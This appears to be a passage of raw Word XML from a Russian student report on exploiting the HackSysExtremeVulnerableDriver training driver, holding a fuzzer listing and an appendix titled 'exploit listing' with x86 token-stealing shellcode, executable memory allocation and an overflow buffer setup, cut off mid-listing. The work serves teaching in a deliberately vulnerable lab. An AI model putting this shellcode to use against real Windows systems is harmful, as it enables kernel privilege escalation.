      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C4ACE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for</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>size_t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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= 0; 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 xml:space="preserve"> &lt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>; ++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0000"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5529391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data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>static_cast</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>char</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&gt;(dis</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>gen</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2980CD4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4D50CC8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return</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> data;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC4254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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D7B9EA" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79040FA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FF"/>
        </w:rPr>
        <w:t>void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Fuzzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD9B57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>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A126B0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srand</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>((</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>unsigned</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)time(0));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA076C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lastRenderedPageBreak/>
        <w:tab/>
        <w:t>std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> buffer = </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>"qwertyUIOP1234567890!@#$%^&amp;*()asdfgHJKLz"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F9B9F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char</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> info[256] = { 0 };</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5EF98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int</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> attempts = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029701D1" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="762D5FA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HANDLE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 xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>CreateFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>L"\\\\.\\HackSysExtremeVulnerableDriver_mbks"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GENERIC_READ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GENERIC_WRITE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FILE_SHARE_READ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FILE_SHARE_WRITE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OPEN_EXISTING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FILE_ATTRIBUTE_NORMAL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>FILE_FLAG_OVERLAPPED</w:t>
      </w:r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>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BA7FE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if</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (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 xml:space="preserve"> == </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>INVALID_HANDLE_VALUE</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC8A3CC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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12408069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printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>"Failed to get device handle: 0x%X\r\n"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, GetLastError());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8AF191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 w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20623513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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="729AD4DE" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38E546FA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DWORD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BytesReturned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 0x00000000;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE0C840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2B91AF"/>
        </w:rPr>
        <w:t>DWORD</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t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 xml:space="preserve"> = 0x222403;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206F1A84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FF"/>
        </w:rPr>
        <w:t>while</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6158F692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  <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF816DB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Mutation(buffer);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4491A4E7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DeviceIoControl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>hDriver</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, (</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>DWORD</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>IoControlCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, (</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>LPVOID</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>buffer.c_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">(), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>buffer.size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">(), </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, 0, &amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>BytesReturned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2270077D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  <w:t>attempts += 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDC0A85" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>snprintf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">(info, 256, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>"\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>rAttempts</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>: %d"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, attempts);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8C6E6E" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>cout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> info;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18752AD6" w14:textId="7777777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68FE0C6F" w14:textId="7B82EF37" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692000EC" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="29068E04" w14:textId="29B10E5F" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="afb"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Приложение В</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D47991C" w14:textId="70910614" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:r>
        <w:t>Листинг эксплойта</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBE15A8" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77DCB4AD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808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>#include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C3BB7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Pr="00AC3BB7"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 w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690C4C1A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808080"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>#include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C3BB7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Pr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>windows.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D07A02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33E55C2B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FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>int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010DB55E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2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>HANDLE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hDriver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;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F37F2A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2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>LPVOID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;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69622195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2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>DWORD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bufLength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;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AF46B9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2B91AF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>DWORD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BytesReturned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;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03390FE3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3F232180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hDriver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CreateFileA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r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>"\\\\.\\HackSysExtremeVulnerableDriver_mbks"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GENERIC_READ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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>GENERIC_WRITE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FILE_SHARE_READ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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>FILE_SHARE_WRITE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NULL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OPEN_EXISTING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0, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r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41C90185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574C29E0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0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>unsigned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C3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>char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shellcode[] =</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEF590F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"\x60"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pushad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3C385064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"\x31\xc0"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eax,eax</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5770F228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"\x64\x8b\x80\x24\x01\x00\x00"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>,[fs:eax+0x124]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2306BC9A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"\x8b\x40\x50"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>,[eax+0x50]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547E3224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"\x89\xc1"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ecx,eax</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="085672E3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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>xba</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>\x04\x00\x00\x00"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>// mov edx,0x4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77821FD7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"\x8b\x80\xb8\x00\x00\x00"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eax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>,[eax+0xb8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560C6FD8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"\x2d\xb8\x00\x00\x00"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>// sub eax,0xb8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362B8B4F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"\x39\x90\xb4\x00\x00\x00"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cmp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 xml:space="preserve"> [eax+0xb4],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</w:p>
    <w:p w14:paraId="3F8C275F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"\x75\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>xed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>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jnz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 xml:space="preserve"> 0x1a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ECF40E6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"\x8b\x90\xf8\x00\x00\x00"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mov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>,[eax+0xf8]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FF9AC24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"\x89\x91\xf8\x00\x00\x00"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AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>// mov [ecx+0xf8],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edx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="584DD331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"\x61"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popad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3CABF138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"\x31\xc0"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xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7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eax,eax</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2B51B2D5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"\x5d"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 xml:space="preserve">// pop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>ebp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="784665C6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AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="A31515"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>"\xc2\x08\x00"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;          </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>// ret 0x8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBB5950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115E199F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VirtualAlloc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r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>NULL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AC3BB7"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(shellcode), </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>MEM_COMMIT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 | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="6F008A"/>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
        <w:t>MEM_RESERVE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PAGE_EXECUTE_READWRITE</w:t>
      </w:r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6209AE25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memcpy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shellcode, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7"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(shellcode));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286AA2ED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1DF91DA4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bufLength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 = 2080 + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
